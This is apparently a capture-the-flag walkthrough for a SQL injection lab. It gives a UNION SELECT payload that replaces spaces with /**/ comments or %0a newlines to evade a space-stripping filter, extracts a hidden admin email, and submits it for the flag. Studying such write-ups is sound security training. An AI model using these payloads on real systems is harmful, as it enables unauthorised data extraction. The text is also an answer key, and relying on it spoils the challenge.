The visible query returns **two** columns (`username`, `email`) and hides the
admin with a leading `is_admin=0` filter. Pick an `id` that matches nothing, then
UNION a second `SELECT` that reads the admin row (`id=1`) — with every space
replaced by `/**/`:

```
?id=0/**/UNION/**/SELECT/**/username,email/**/FROM/**/users/**/WHERE/**/id=1
```

To be safe, URL-encode the punctuation so it travels intact (`/`=`%2F`,
`*`=`%2A`, `,`=`%2C`, `=`=`%3D`); the filter decodes it back on the far side and
still forwards zero spaces. The database ends up running, in effect:

```sql
SELECT username, email FROM users
WHERE is_admin=0 AND id=0 UNION SELECT username,email FROM users WHERE id=1
```

`is_admin=0 AND id=0` returns nothing; the UNION appends the hidden admin row, so
its email (`admin-<16 hex>@lab.internal`) is rendered as a directory result. Copy
that email and hand it to the win endpoint:

```
/solve?email=admin-<16 hex>@lab.internal
```

A correct email returns the flag; a wrong one returns 403. The address is random
per instance, so use the one _your_ container leaked. Prefer newlines? The same
attack works with `%0a` in place of every `/**/` — the filter strips spaces and
tabs but never newlines.
